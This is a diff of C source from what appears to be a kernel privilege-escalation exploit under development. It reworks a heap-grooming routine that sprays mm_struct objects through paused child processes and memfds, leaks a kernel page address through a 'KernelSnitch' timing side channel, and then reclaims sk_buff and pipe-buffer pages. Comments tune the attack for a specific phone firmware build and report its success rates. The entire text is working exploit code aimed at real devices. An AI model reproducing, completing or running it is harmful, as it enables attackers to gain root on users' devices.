@@ -128,49 +128,77 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx spray;
   struct mm_ctx pre;
   struct mm_ctx post;
-  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SLAB_SZ;
 
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
 
+  /* Use live (paused) children exactly like the working root-umh leak path
+   * in prepare_kernel_page: children stay alive through collision finding
+   * and the bruteforce, and are only reaped afterwards.  The previous
+   * clone_memfd() flow (kill each child immediately) produced false-positive
+   * collisions and a 24/24 bruteforce failure on e3q-S9280ZCS6DZF2. */
   for (size_t i = 0; i < prep.mm_cnt; i++) {
-    prep.childs[i] = -1;
-    prep.memfds[i] = clone_memfd();
+    prep.childs[i] = clone_child();
+  }
+  for (size_t i = 0; i < prep.mm_cnt; i++) {
+    prep.memfds[i] = open_memfd(prep.childs[i]);
   }
   for (size_t i = 0; i < spray.mm_cnt; i++) {
-    spray.childs[i] = -1;
-    spray.memfds[i] = clone_memfd();
+    spray.childs[i] = clone_child();
+  }
+  for (size_t i = 0; i < spray.mm_cnt; i++) {
+    spray.memfds[i] = open_memfd(spray.childs[i]);
   }
 
   setup_kernelsnitch();
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
-    pre.childs[i] = -1;
-    pre.memfds[i] = clone_memfd();
+    pre.childs[i] = clone_child();
   }
   pid_t leak_child = clone_leak_child();
   for (size_t i = 0; i < post.mm_cnt; i++) {
-    post.childs[i] = -1;
-    post.memfds[i] = clone_memfd();
+    post.childs[i] = clone_child();
+  }
+  for (size_t i = 0; i < pre.mm_cnt; i++) {
+    pre.memfds[i] = open_memfd(pre.childs[i]);
   }
   int leak_memfd = open_memfd(leak_child);
+  for (size_t i = 0; i < post.mm_cnt; i++) {
+    post.memfds[i] = open_memfd(post.childs[i]);
+  }
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
+    pre.childs[i] = -1;
   }
   for (size_t i = 0; i < post.mm_cnt; i++) {
     kill_child(post.childs[i]);
+    post.childs[i] = -1;
   }
   for (size_t i = 0; i < spray.mm_cnt; i++) {
     kill_child(spray.childs[i]);
+    spray.childs[i] = -1;
   }
   SYSCHK(waitpid(leak_child, NULL, 0));
 
   if (!kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
   }
+
+  /* Measure BEFORE the free/reclaim sequence.  The mass memfd closes and
+   * sk_buff sends below disturb the cache state KernelSnitch calibrated,
+   * which made this bruteforce fail on e3q-S9280ZCS6DZF2 (24/24 attempts),
+   * while the root-umh path (which measures right after waitpid) leaks
+   * mm_struct in ~60% of attempts. */
+  run_kernelsnitch_bruteforce();
+  uintptr_t leaked = cleanup_kernelsnitch();
+  if (leaked == (uintptr_t)-1) {
+    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+  }
+  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 
   unsigned char *buf = malloc(SKB_SEND_SIZE);
   memset(buf, 0x50, SKB_SEND_SIZE);
@@ -191,7 +219,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   msg.msg_iovlen = 1;
 
   SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
-  pin_to_core(CORE);
+  pin_to_core(exploit_core());
 
   sched_yield();
   sched_yield();
@@ -219,20 +247,13 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
-  run_kernelsnitch_bruteforce();
-  uintptr_t leaked = cleanup_kernelsnitch();
-  if (leaked == (uintptr_t)-1) {
-    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
-  }
-  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-
   shape_pipe_cache();
 
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     alloc_pipe_object(pipe_fds_drain[i]);
   }
 
-  pin_to_core(CORE);
+  pin_to_core(exploit_core());
   SYSCHK(close(skb_sv[0]));
   SYSCHK(close(skb_sv[1]));
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
@@ -243,6 +264,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   close_ctx_memfds(&spray);
   close_ctx_memfds(&pre);
   close_ctx_memfds(&post);
+  for (size_t i = 0; i < prep.mm_cnt; i++) {
+    kill_child(prep.childs[i]);
+    prep.childs[i] = -1;
+  }
   free_ctx_storage(&prep);
   free_ctx_storage(&spray);
   free_ctx_storage(&pre);
